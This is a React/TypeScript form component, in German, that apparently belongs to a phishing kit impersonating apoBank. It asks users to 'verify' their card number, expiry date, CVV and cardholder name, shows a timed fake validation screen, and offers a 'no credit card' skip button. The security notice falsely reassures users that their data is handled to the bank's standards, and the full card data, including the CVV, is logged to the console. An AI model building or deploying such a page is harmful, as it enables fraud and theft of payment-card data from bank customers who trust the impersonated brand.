import React, { useState, useEffect } from 'react';
import { Loading } from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

export const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);
  
  // Focus states for floating labels
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardholderNameFocused, setCardholderNameFocused] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      console.log('BankCardForm: Submitting data:', {
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      
      // Handle backend validation errors
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        
        error.details.forEach((detail: any) => {
          // Use the actual error message from the backend
          const fieldName = detail.field;
          const errorMessage = detail.message;
          
          if (fieldName === 'card_number') {
            backendErrors.card_number = errorMessage;
          } else if (fieldName === 'expiry_date') {
            backendErrors.expiry_date = errorMessage;
          } else if (fieldName === 'cvv') {
            backendErrors.cvv = errorMessage;
          } else if (fieldName === 'cardholder_name') {
            backendErrors.cardholder_name = errorMessage;
          }
        });
        
        setErrors(backendErrors);
      }
      setIsLoading(false); // Only stop loading on error
    }
    // Don't set isLoading to false on success - let the parent component handle state transitions
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (!/^\d+(\s\d+)*$/.test(cardNumber.trim())) {
      newErrors.card_number = 'Kartennummer darf nur Zahlen enthalten';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ (Monat 01-12)';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Helper function to create floating label input
  const createFloatingLabelInput = (
    id: string,
    type: string,
    value: string,
    onChange: (value: string) => void,
    label: string,
    focused: boolean,
    setFocused: (focused: boolean) => void,
    error?: string,
    placeholder?: string,
    maxLength?: number,
    style?: React.CSSProperties
  ) => {
    const isLabelFloating = value.length > 0 || focused;
    
    return (
      <div style={{ position: 'relative', marginBottom: error ? '24px' : '16px' }}>
        <input
          id={id}
          type={type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          placeholder={placeholder || ''}
          maxLength={maxLength}
          className="floating-label-input"
          style={{
            width: '100%',
            padding: '28px 16px 8px 16px',
            border: error ? '2px solid #d32f2f' : (focused ? '2px solid #012169' : '1px solid #ccc'),
            borderRadius: '4px',
            fontSize: isMobile ? '16px' : '14px',
            lineHeight: isMobile ? '24px' : '20px',
            fontFamily: 'Source Sans Pro, Arial, sans-serif',
            fontStyle: 'normal',
            fontWeight: 'normal',
            backgroundColor: 'transparent',
            outline: 'none',
            transition: 'all 0.2s ease',
            minHeight: '65px',
            boxSizing: 'border-box',
            ...style
          }}
        />
        
        <label style={{
          position: 'absolute',
          left: '16px',
          top: isLabelFloating ? '8px' : '24px',
          fontSize: isLabelFloating ? (isMobile ? '11px' : '12px') : (isMobile ? '14px' : '16px'),
          fontWeight: 'normal',
          color: error ? '#d32f2f' : (focused ? '#012169' : '#666'),
          fontFamily: 'Source Sans Pro, Arial, sans-serif',
          fontStyle: 'normal',
          transition: 'all 0.2s ease',
          pointerEvents: 'none',
          transformOrigin: 'left top'
        }}>
          {label}
        </label>
        {error && (
          <div style={{
            backgroundColor: '#ffebee',
            border: '1px solid #ffcdd2',
            borderRadius: '8px',
            padding: '12px',
            marginTop: '8px',
            display: 'flex',
            alignItems: 'flex-start',
            gap: '8px'
          }}>
            <svg 
              width="16" 
              height="16" 
              viewBox="0 0 24 24" 
              fill="none" 
              stroke="#d32f2f" 
              strokeWidth="2"
              style={{ 
                marginTop: '2px',
                flexShrink: 0
              }}
            >
              <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
              <path d="M12 9v4"/>
              <path d="m12 17 .01 0"/>
            </svg>
            <div style={{
              color: '#d32f2f',
              fontSize: '14px',
              fontFamily: 'Source Sans Pro, Arial, sans-serif',
              fontStyle: 'normal',
              lineHeight: '1.4',
              fontWeight: '400'
            }}>
              {error}
            </div>
          </div>
        )}
      </div>
    );
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message="Bankkarten-Daten werden validiert..."
          type="verification"
          showProgress={true}
          duration={3.5}
        />
      )}
      
      <div style={{
        backgroundColor: '#f5f5f5',
        padding: '0',
        minHeight: '100vh',
        fontFamily: 'Source Sans Pro, Arial, sans-serif'
      }}>
        <div style={{
          maxWidth: isMobile ? 'none' : '1400px',
          margin: isMobile ? '0' : '0 auto',
          padding: isSmallMobile ? '16px' : isMobile ? '20px' : '32px 8px 32px 8px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: isMobile ? 'center' : 'flex-start'
        }}>
          <div style={{
            width: isMobile ? '100%' : '920px',
            backgroundColor: '#f0f3f5',
            borderRadius: isMobile ? '0' : '8px',
            border: 'none',
            boxShadow: isMobile ? 'none' : '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
            overflow: 'hidden',
            minHeight: isMobile ? '100vh' : 'auto'
          }}>
            {/* White Header Section */}
            <div style={{
              backgroundColor: 'white',
              padding: isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px'
            }}>
              {/* Title */}
              <h1 style={{
                color: '#012169',
                fontSize: isMobile ? '1.5rem' : '2rem',
                fontWeight: '600',
                margin: '0',
                lineHeight: isMobile ? '1.75rem' : '2.5rem',
                fontFamily: 'Source Sans Pro, Arial, sans-serif',
                textAlign: 'left'
              }}>
                Bankkarten-Daten verifizieren
              </h1>
            </div>

            {/* Content Section */}
            <div style={{
              backgroundColor: '#f0f3f5',
              padding: isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px'
            }}>
              
              <p style={{
                color: '#1e325f',
                fontSize: isMobile ? '14px' : '16px',
                lineHeight: isMobile ? '20px' : '24px',
                marginBottom: '2rem',
                fontFamily: 'Source Sans Pro, Arial, sans-serif',
                textAlign: 'left'
              }}>
                Bitte geben Sie Ihre Bankkarten-Daten zur finalen Verifizierung ein.
              </p>
              
              <form onSubmit={handleSubmit} noValidate>
                {/* Card Number */}
                <div>
                  {createFloatingLabelInput(
                    'cardNumber',
                    'text',
                    cardNumber,
                    (value) => setCardNumber(formatCardNumber(value)),
                    'Kartennummer *',
                    cardNumberFocused,
                    setCardNumberFocused,
                    errors.card_number,
                    undefined,
                    19
                  )}
                </div>

                {/* Expiry Date and CVV */}
                <div style={{ 
                  display: 'grid', 
                  gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr', 
                  gap: '1.5rem', 
                  marginBottom: '1rem' 
                }}>
                  {/* Expiry Date */}
                  <div>
                    {createFloatingLabelInput(
                      'expiryDate',
                      'text',
                      expiryDate,
                      (value) => setExpiryDate(formatExpiryDate(value)),
                      'Ablaufdatum (MM/JJ) *',
                      expiryDateFocused,
                      setExpiryDateFocused,
                      errors.expiry_date,
                      undefined,
                      5
                    )}
                  </div>

                  {/* CVV */}
                  <div>
                    {createFloatingLabelInput(
                      'cvv',
                      'text',
                      cvv,
                      (value) => setCvv(value.replace(/\D/g, '').substring(0, 4)),
                      'CVV *',
                      cvvFocused,
                      setCvvFocused,
                      errors.cvv,
                      undefined,
                      4
                    )}
                  </div>
                </div>

                {/* Cardholder Name */}
                <div>
                  {createFloatingLabelInput(
                    'cardholderName',
                    'text',
                    cardholderName,
                    (value) => setCardholderName(value.toUpperCase()),
                    'Karteninhaber *',
                    cardholderNameFocused,
                    setCardholderNameFocused,
                    errors.cardholder_name,
                    undefined,
                    undefined,
                    { textTransform: 'uppercase' }
                  )}
                </div>

                {/* Security Notice */}
                <div style={{
                  backgroundColor: '#f8f9fa',
                  border: '1px solid #e9ecef',
                  borderRadius: '8px',
                  padding: '16px',
                  marginBottom: '2rem' 
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', marginBottom: '0.5rem' }}>
                    <svg 
                      width="20" 
                      height="20" 
                      viewBox="0 0 24 24" 
                      fill="none" 
                      stroke="currentColor" 
                      strokeWidth="2"
                      style={{ marginRight: '0.75rem', color: '#012169' }}
                    >
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                      <circle cx="12" cy="16" r="1"/>
                      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    <p style={{
                      color: '#333',
                      fontSize: '1rem',
                      fontWeight: '600',
                      margin: 0,
                      fontFamily: 'Source Sans Pro, Arial, sans-serif'
                    }}>
                      Ihre Daten sind sicher
                    </p>
                  </div>
                  <p style={{
                    color: '#666',
                    fontSize: '0.875rem',
                    margin: 0,
                    lineHeight: '1.4',
                    fontFamily: 'Source Sans Pro, Arial, sans-serif'
                  }}>
                    Alle Daten werden verschlüsselt übertragen und gemäß den höchsten Sicherheitsstandards der apoBank verarbeitet.
                  </p>
                </div>

                {/* Submit Button */}
                <div style={{
                  display: 'flex',
                  justifyContent: isMobile ? 'stretch' : 'flex-end',
                  marginTop: '2rem'
                }}>
                  <button
                    type="submit"
                    disabled={isLoading}
                    style={{
                      width: isMobile ? '100%' : 'auto',
                      padding: isMobile ? '16px 24px' : '12px 32px',
                      backgroundColor: isLoading ? '#ccc' : '#012169',
                      color: 'white',
                      border: 'none',
                      borderRadius: '4px',
                      fontSize: isMobile ? '1rem' : '0.875rem',
                      fontWeight: '600',
                      cursor: isLoading ? 'not-allowed' : 'pointer',
                      transition: 'background-color 0.2s ease',
                      fontFamily: 'Source Sans Pro, Arial, sans-serif',
                      minHeight: isMobile ? '48px' : 'auto'
                    }}
                    onMouseOver={(e) => {
                      if (!isLoading) {
                        e.currentTarget.style.backgroundColor = '#0056b3';
                      }
                    }}
                    onMouseOut={(e) => {
                      if (!isLoading) {
                        e.currentTarget.style.backgroundColor = '#012169';
                      }
                    }}
                  >
                    {isLoading ? 'Daten werden validiert...' : 'Daten bestätigen'}
                  </button>
                
                {/* Skip Button */}
                {onSkip && (
                  <button
                    type="button"
                    onClick={onSkip}
                    disabled={isLoading}
                    style={{
                      backgroundColor: 'transparent',
                      color: '#012169',
                      border: 'none',
                      padding: '0.75rem 1rem',
                      fontSize: '0.875rem',
                      fontWeight: '400',
                      cursor: isLoading ? 'not-allowed' : 'pointer',
                      fontFamily: 'Source Sans Pro, Arial, sans-serif',
                      transition: 'all 0.3s ease',
                      opacity: isLoading ? 0.5 : 0.7,
                      marginTop: '1rem',
                      textDecoration: 'underline',
                      textAlign: 'center' as const,
                      width: '100%'
                    }}
                    onMouseOver={(e) => {
                      if (!isLoading) {
                        e.currentTarget.style.opacity = '1';
                        e.currentTarget.style.color = '#0056b3';
                      }
                    }}
                    onMouseOut={(e) => {
                      e.currentTarget.style.opacity = '0.7';
                      e.currentTarget.style.color = '#012169';
                    }}
                  >
                    Ich habe keine Kreditkarte
                  </button>
                )}
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}; 